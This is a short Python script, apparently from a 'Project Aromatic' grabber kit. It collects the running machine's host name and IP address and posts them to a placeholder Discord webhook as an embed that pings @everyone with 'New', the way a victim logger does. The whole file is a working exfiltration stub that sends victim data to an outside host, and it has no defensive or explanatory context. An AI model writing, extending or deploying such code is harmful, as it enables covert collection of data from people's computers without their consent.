import requests
import socket
import time

host = socket.gethostname()
ip = socket.gethostbyname(host)

h00k = "You Webhook here"

data = {
    "embeds": [{
        "avatar_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRzYpikPP4JfmxrQTTmPTl8E_0pf9wc50rUQA&s",
        "username": "Aromatic Chan",
        "content": "@everyone New",
        "title": "Aromatic ^-^ IP Info",
        "thumbnail": {
            "url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRzYpikPP4JfmxrQTTmPTl8E_0pf9wc50rUQA&s"
        },
        "fields": [
            {
                "name": "💻️ Host Name",
                "value": f"{host}",
                "inline": True
            },
            {
                "name": "👀 IP Address",
                "value": f"{ip}",
                "inline": True
            },
        ],
        "footer": {
            "text": "Make by Project Aromatic"
        }
    }]
}


response = requests.post(h00k, json=data)
